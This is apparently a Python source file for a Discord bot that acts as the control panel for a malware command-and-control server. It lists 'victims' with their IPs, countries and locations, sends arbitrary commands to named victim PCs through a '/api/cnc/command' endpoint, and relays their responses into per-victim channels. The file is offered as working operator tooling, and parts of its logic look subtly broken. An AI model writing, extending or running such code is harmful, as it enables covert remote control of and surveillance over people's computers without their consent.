import discord
from discord import app_commands
from discord.ext import commands
from icecream import ic
import requests
import io
import pprint
import ast
from discord.ext import tasks
import io




    
def process_for_pprint(data):
    # If the input is a string, convert it to a dictionary
    if isinstance(data, str):
        try:
            data = ast.literal_eval(data)
        except ValueError:
            return None

    # If the data is a dictionary, format it as a string with line breaks
    if isinstance(data, dict):
        output = ""
        for key, value in data.items():
            output += f"{key}: {value}\n"
        return output.strip()

    return None

def capture_pprint(data):
    data = process_for_pprint(data)
    buffer = io.StringIO()
    pprint.pprint(data, stream=buffer)
    output = buffer.getvalue()
    buffer.close()
    return output


                    
    


prefix = '.'

class BOT:
    def __init__(self,guild_id:str,db,URL="http://localhost:8000",prefix='.'):
        intents = discord.Intents.default()        
        intents.guilds = True
        bot   = commands.Bot(command_prefix=prefix,intents=intents)
        self.bot = bot
        self.db = db
        self.guild_id = int(guild_id)
        self.URL = URL
        @bot.event
        async def on_ready():
            ic("BOT UP AND RUNNING")
            synced = await bot.tree.sync()
            ic(f"Synced: {synced}")
            await makecatgs()
            await self.check_for_responses()

        
        tasks.loop(seconds=10)
        async def makecatgs():
            clients = db._return_all_uuids()
            guild = bot.get_guild(int(guild_id))
            if guild:
                for client in clients:
                    name = f"{db.uuid_to_name(str(client[0]).strip())}__{str(client[0]).strip()}"
                    try:
                        if not self.iscategory(name):
                            category = await guild.create_category(name)
                            await guild.create_text_channel("send_commands", category=guild.get_channel(category.id))
                            await guild.create_text_channel("responses_text", category=guild.get_channel(category.id))
                            await guild.create_text_channel("responses_files", category=guild.get_channel(category.id))
                    except discord.HTTPException as e:
                        continue
            else:
                ic(guild_id)
        
        
                
        
        @bot.tree.command(name="ping")
        async def ping(interaction:discord.Interaction):
            await interaction.response.send_message(f'Pong! {round(bot.latency * 1000)} ms')

        @bot.tree.command(name="show_victims")
        @app_commands.describe(show_all_info = "wether to show all the stored data on the victim or just the name")
        async def victims(interaction:discord.Interaction, show_all_info:bool=False):
            if show_all_info:
                info = db.return_all_victims_data()
                inf = '`ID Name IP Country Location`\n\n'
                for victim in info:
                    inf = inf +"`"+str(victim)+'`\n'
                info = inf
                
                if len(str(info)) > 2000:
                    try:
                        info1 = info[:len(info)//2]
                        info2 = info[:len(info)//2:]
                        await interaction.response.send_message(f'{str(info1)}')
                        await interaction.response.send_message(f'{str(info2)}')
                    except discord.errors.HTTPException:
                        await interaction.response.send_message("to many victims please use the web interface to view this")
                else:
                    await interaction.response.send_message(f'{str(info)}')

                    
            else:
                info = db.return_all_victims_names()
                inf = ''
                for victim in info:
                    inf = inf +"`"+str(victim[0])+'`\n'
                info = inf
                if len(str(info)) > 2000:
                    try:
                        info1 = info[:len(info)//2]
                        info2 = info[:len(info)//2:]
                        await interaction.response.send_message(f'{str(info1)}')
                        await interaction.response.send_message(f'{str(info2)}')
                    except discord.errors.HTTPException:
                        await interaction.response.send_message("to many victims please use the web interface to view this")
                else:
                    await interaction.response.send_message(f'{str(info)}')

        @bot.tree.command(name="new_command")
        @app_commands.describe(command = "a command to send to the client",target = "the victim's pc name",parameter = "a paramater to the command NOT REQUOIRED")
        async def new_command(interaction:discord.Interaction,command:str,target:str,parameter:str or None =None):
            Data = {"command":command, "target":target, "parameter":str(parameter)}
            r    = requests.post(URL+"/api/cnc/command",json=Data)
            await interaction.response.send_message(f"```Status: {r.status_code}\nResponse: {r.text}```")
        
        @bot.tree.command(name="check_response")
        @app_commands.describe(time="check for responses in the last N seconds")
        async def check_response(interaction:discord.Interaction,time:int=60):
            await self.check_for_responses(time)
            await interaction.response.send_message("```Checking```")
    
    def resp_manager(self,resp:str):
            if type(resp) == type(list):
                rsponses = []
                for respns in resp:
                    rsponses.append(f"**ResponseTime**: `{respns[1]}`\n**Command**: `{respns[2]}`\n**Result**:`{respns[4]}`\n**Response**:```{str(respns[3])}```")
            elif type(resp) == type(tuple):
                return (f"**ResponseTime**: `{respns[1]}`\n**Command**: `{respns[2]}`\n**Result**:`{respns[4]}`\n**Response**:```{str(respns[3])}```")
            elif type(resp) == type(str):
                return resp
            else:
                return resp
                
    def iscategory(self,category_name:str):
        guild = self.bot.get_guild(self.guild_id)

        if guild:

            category_exists = False
            for category in guild.categories:
                if category.name == category_name:
                    category_exists = True
                    break
        return category_exists
    
    def get_channel_id(self,channel_name:str):
        guild = self.bot.get_guild(self.guild_id)

        if guild:
            target_channel_name = channel_name

            for channel in guild.channels:
                if channel.name == target_channel_name:
                    channel_id = channel.id
                    break
        try:
            return int(channel_id)
        except:
            return None

    async def check_for_responses(self,time:int=10):
        ic("Checking")
        clients = self.db._return_all_uuids()
        for client in clients:
            client_uuid = str(client[0])
            client_id = self.db.uuid_to_id(client_uuid)
            ic(client_id)
            responses = self.db.get_latest_responses(client_id,time)
            if responses:
                name = f"{self.db.uuid_to_name(client_uuid).strip()}__{client_uuid.strip()}"
                channel_id = self.get_channel_id(name)
                cat_channel = self.bot.get_channel(channel_id)
                if channel_id:
                    for channel in cat_channel.text_channels:
                        if channel.name == "responses_text":
                            break
                        else:
                            continue
                if channel:
                    for response in responses:   
                        ic(response)
                        resp = self.resp_manager(response)
                        if type(resp) == list:
                                for respons in resp:
                                    if respons != None and len(str(respons)) > 0:
                                        if len(str(respons)) > 1999:
                                            obj = self.create_file_inmemory(respons)
                                            file = discord.File(obj,filename="Response.txt")
                                            await channel.send(file=file)
                                        else:
                                            try:
                                                await channel.send(respons)
                                            except:
                                                obj = self.create_file_inmemory(respons)
                                                file = discord.File(obj,filename="Response.txt")
                                                await channel.send(file=file)
                                    else:
                                        await channel.send("Empty response")

                                    
                        else:
                                if resp != None:
                                    if len(str(resp)) >0:
                                        if len(str(resp)) > 1999:
                                            obj = self.create_file_inmemory(resp)
                                            file = discord.File(obj,filename="Response.txt")
                                            await channel.send(file=file)
                                        else:
                                            try:
                                                await channel.send(resp)
                                            except:
                                                obj = self.create_file_inmemory(resp)
                                                file = discord.File(obj,filename="Response.txt")
                                                await channel.send(file=file)
                                else:
                                    ic(resp)
                                    await channel.send(f"Response is None + {resp}")
                        
                else:
                    ic(name)
                    ic(channel_id)
                    ic("Channel Error")
    def create_file_inmemory(self,text:any):
        file_obj = io.StringIO()
        file_obj.write(str(text))
        return io.BytesIO(file_obj.getvalue().encode())